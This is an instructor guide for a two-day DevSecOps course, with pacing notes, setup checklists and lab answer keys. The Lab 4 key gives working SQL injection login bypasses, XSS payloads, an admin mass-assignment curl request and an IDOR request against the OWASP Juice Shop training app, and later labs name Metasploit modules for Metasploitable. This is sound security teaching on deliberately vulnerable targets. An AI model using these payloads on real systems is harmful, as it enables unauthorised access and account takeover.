# Instructor Guide — DevSecOps (2 days)

This guide is for the person delivering the course. Learners should not see it during class — it contains lab solutions and pacing tells.

---

## Pre-class checklist (the day before)

Learners create their own Cloud9 in Lab 1. Everything below is your job, done before learners arrive.

### Account-level setup (once per cohort)

- [ ] AWS shared training account exists; learners have sign-in credentials
- [ ] IAM role `devsecops-lab-role` exists (trust: EC2) with managed policies attached: `CloudWatchLogsFullAccess`, `CloudWatchFullAccessV2`, `AmazonSNSFullAccess`
- [ ] Course materials repo URL is ready to give learners (`git clone` target for Lab 1 step 3)
- [ ] VPC quota in the chosen region is sized for one Cloud9 per learner

### Dry-run before delivery

- [ ] On a sample Cloud9 (`m5.large`, Amazon Linux 2023, SSH, role attached): clone the repo, run `bash labs/lab-01/scripts/setup-cloud9.sh smoke`, then `bash tests/smoke.sh smoke` — expect 32/32 pass
- [ ] Confirms the IAM role + setup script + targets + Jenkins pre-stage all work end-to-end
- [ ] Have a backup Cloud9 you can hand to a learner whose environment fails irrecoverably
- [ ] Confirm each learner has a personal email address for Lab 8's SNS subscription

---

## Pacing tells per module

### Module 1 — What is DevSecOps? (45 min)

- Strong intro signal: have learners volunteer their team's current "level" on the maturity model slide. If most pick 0–1, lean into shift-left content. If most pick 2–3, lean into automation/metrics.
- **Skip if pressed for time:** the "Roles" slide. The "Maturity model" slide stays — it anchors the close-out conversation.
- Ends with **Lab 1**. Lab 1 is the single biggest "stuff goes wrong" moment of the day — IAM role attach mistakes are the usual culprit.

### Module 2 — Thinking like a hacker (45 min)

- Spend longer on the **Three questions** slide than the kill chain. The mindset is the durable skill.
- **Lab 2** outputs feed into Lab 5 — encourage learners to keep their recon report open between labs.

### Module 3 — App vs Infra threats (45 min, no lab)

- This is the only module without a lab. Use the time to take questions and break long stretches of slides with discussion.
- The **Where should the control live?** table is the keep-or-cut decider. Keep it.

### Module 4 — Threat maps (30 min teach + 45 min lab)

- The **STRIDE-per-element cheat sheet** is the load-bearing slide for the lab. Don't rush past it.
- During the lab, walk the room — pairs that try to threat-model "everything" stall. Push them to pick a single high-traffic flow.

### Module 5 — OWASP & upstream (45 min, no lab Day 1)

- Top 10 sub-slides at ~30 sec each. Don't elaborate every category — anchor on A01, A03, A04, A06.
- Tell learners Lab 4 happens first thing Day 2 — they should sleep on the categories.

### Module 6 — Pen testing (30 min)

- Spend disproportionate time on **Scoping** and **RoE** — these are what makes pen testing professional.
- Lab 5's RoE is a real document they could adapt for their org.

### Module 7 — Metasploit & ZAP (30 min)

- Two parts, two labs. Don't deep-dive Metasploit module internals — the lab will teach the workflow.
- Mention purple-teaming explicitly — it reframes the tool for learners who don't see themselves as offensive.

### Module 8 — Monitoring (30 min)

- The **Same ideas, on AWS** mapping slide is the most important — it bridges the Azure teaching to the AWS lab.
- Don't go deep on Sentinel; mention as "this is where you grow into."

### Module 9 — Automation (15 min, condensed)

- This is intentionally short to give Lab 9 the time it needs.
- The **Where each module fits** table doubles as the course recap. Use it to verbally reinforce the through-line before launching the capstone.
- The capstone closes the course — no formal wrap-up slides. End on the second build going green.

---

## Lab solutions & expected outcomes

> Hide this section in any printed handout. These are answer keys.

### Lab 4 — OWASP Juice Shop challenges

#### A01: View someone else's basket

The endpoint is `GET /rest/basket/<id>`. After login, the user's session token grants access to the basket whose `id` is in the JWT — *but the server doesn't verify ownership when the path id changes*. Steps that work:

1. Log in as your registered user, capture the `Authorization: Bearer <jwt>` header in DevTools.
2. `curl -H "Authorization: Bearer <jwt>" http://localhost:3000/rest/basket/1` returns admin's basket.

**Fix:** server-side ownership check on `BasketId` against the authenticated user.

#### A01: Become an admin via mass assignment

Registration POST body normally is `{"email": ..., "password": ..., "passwordRepeat": ...}`. The Sequelize model accepts an extra `role` field. Send:

```bash
curl -X POST http://localhost:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"x@x.com","password":"x","passwordRepeat":"x","role":"admin"}'
```

**Fix:** allow-list fields in the controller; never pass request body straight to the ORM.

#### A03: SQL injection on login

The login concatenates the email into a SQL query. Email field payload `' OR 1=1 --` returns the first user (often the admin). Variants if filtered:

- `admin@juice-sh.op'--` — bypass with a real email
- `' OR true --`

**Fix:** parameterised query, bcrypt-compare passwords.

#### A03: Reflected XSS

Search query renders unescaped. Payloads that work in modern browsers:

- `<iframe src="javascript:alert(1)">`
- `<img src=x onerror="alert(1)">`

Some require URL-encoding inside `q=`. The hash router quirk means `/#/search?q=` is the path.

**Fix:** context-aware HTML encoding; CSP that blocks inline scripts.

#### A06: Trivy dependency scan

Expect ~80–150 HIGH+CRITICAL findings on `bkimminich/juice-shop:latest`. The biggest culprits are typically the Node base image's OS packages plus `marsdb`, `sanitize-html`, and outdated transitive deps. The point of the exercise is reading the report, not fixing it.

---

### Lab 5 — expected exploit chains

The lab gives learners free choice. Common picks and what to watch for:

| Choice | Expected path | Watch for |
|---|---|---|
| Metasploitable: shell via vsftpd | `exploit/unix/ftp/vsftpd_234_backdoor` | Some learners try AFP / Samba modules — gently steer back |
| Metasploitable: ManageEngine / DistCC | `exploit/unix/misc/distcc_exec` works | Don't let them run multiple modules — RoE says one |
| Juice Shop: enumerate admins | `curl /api/Users/` returns email + role | Easy & fast — push pair to write a clean finding |
| Juice Shop: price tampering | `PUT /api/BasketItems/<id>` with negative quantity | Tests the report-writing skill more than exploit skill |

The grading question for the cross-pair walkthrough: **could another engineer fix this from your write-up alone?** If no, push them to sharpen the **Recommended fix** section.

---

### Lab 6 — Metasploit gotchas

- Some learners see "exploit completed, but no session was created" on first run of vsftpd_234_backdoor. **Solution:** re-run. The backdoor is finicky; second attempt works ~95% of the time.
- If `db_nmap` complains about Postgres, run `msfdb init && msfdb start` inside the container.

---

### Lab 7 — ZAP gotchas

- ZAP container runs as `zap` user (uid 1000). The bind-mounted `~/environment/devsecops-work/zap` directory must be writable by that uid, hence the `chmod 777` in the README. If learners skipped it, you'll see "permission denied" writing the report.
- The baseline scan finds Mediums but rarely Highs against Juice Shop. That's fine — Lab 9's gate uses ≥ Medium-equivalent thresholds.

---

### Lab 8 — common alarm-not-firing failures

Diagnostic tree if a learner's alarm stays in `INSUFFICIENT_DATA`:

1. **Are events arriving?** `aws logs tail /devsecops-lab/<name>/signin --follow` — should show events.
2. **Does the metric filter match?** AWS console → CloudWatch → Logs → Log groups → log group → Metric filters → click filter → **Test pattern** with a sample event.
3. **Is the metric publishing?** AWS console → CloudWatch → All metrics → namespace `DevSecOpsLab` → metric `FailedSignins-<name>`. If no data points after 5 min of events, the filter pattern is wrong.
4. **Is the alarm wired correctly?** Period 60 s × evaluation 5 = 5-min window. If learner set period 300 s × evaluation 5, that's 25 min before fire.
5. **Did they confirm the SNS subscription?** `aws sns list-subscriptions-by-topic --topic-arn $TOPIC_ARN` — `SubscriptionArn` should not say `PendingConfirmation`.

---

### Lab 9 — capstone verification

**Before class on Day 2 PM:** spot-check 3 random learners' Cloud9s by SSH or Cloud9 console:

```bash
docker ps --filter name=ds-jenkins --format '{{.Names}} {{.Status}}'
docker exec ds-jenkins ls /var/sample-repo
```

Both should succeed. If either fails, run on that Cloud9:

```bash
cd ~/environment/devsecops-work/lab9/jenkins
docker compose up -d
sleep 30
docker exec -u root ds-jenkins apt-get install -y -qq docker.io jq
```

**Expected first-build duration:** 8–12 min (image pulls inside the pipeline are the bottleneck — Trivy and ZAP pull from the host's docker daemon since we mount the docker socket, so they should be fast).

**Expected gate failure on first build:** the ZAP baseline against Juice Shop typically finds 2–6 High-risk alerts (mostly XSS and CSP/header issues). Any non-zero count fails the gate with `ALLOWED_HIGH=0`.

**Path to green:** learners set `ALLOWED_HIGH` to >= the actual count. Encourage them to commit with a justification message — the practice matters more than the threshold value.

---

## Common gotchas across the course

| Symptom | Where seen | Fix |
|---|---|---|
| Learner can't run `aws` commands | Lab 8 | Step 2 of Lab 1 — managed creds still on, or role not attached |
| `curl localhost:3000` returns nothing | Any lab | Juice Shop container died — `docker start juice-shop-<name>` or re-run setup script |
| Cloud9 disk fills | Day 2 afternoon | `docker image prune -a` between labs — frees 3–5 GB |
| Cloud9 OOM | Lab 9 | Stop the metasploit/ZAP containers between Lab 7 and Lab 9; they're not needed during Lab 9 since Jenkins runs them itself |
| Learner deleted their devsecops-lab-env.md | Any lab after 1 | `bash scripts/setup-cloud9.sh <name>` is idempotent; re-creates it |
| Metasploitable container won't start | Lab 1 | Some Cloud9 kernels reject the image. Backup: instructor pre-builds an alternative target, or learner pairs with another |

---

## Time-flex levers

If running ahead of schedule:
- Add 5 min to the Lab 4 retro — discuss which Top 10 categories surprised them
- Add the optional **stretch goal** to any lab (each has them at the bottom)

If running behind:
- Skip Lab 5 cross-pair walkthrough (already optional)
- Skip Lab 7 stretch sections (full scan is already moved to stretch)
- Trim Module 5 sub-slides on A05 / A07 / A09 — they're the lower-leverage Top 10 categories
- Lab 8 cleanup is post-class — never do it in-band

If a learner falls behind:
- Pair them with someone ahead — works for Labs 3, 4, 5
- Hand them the answer key for Labs 4/5 if they're stuck for >10 min — they still benefit from running it
- For Lab 9, walk them through Steps 1–3 personally; they catch up on the build observation

---

## Final-day close

After the second build goes green:

1. One sentence per learner: "the one thing I'm changing Monday."
2. Point at the README's instructor pre-work section — anyone running this internally needs it.
3. Done.

No formal wrap-up slides. The capstone *is* the close.
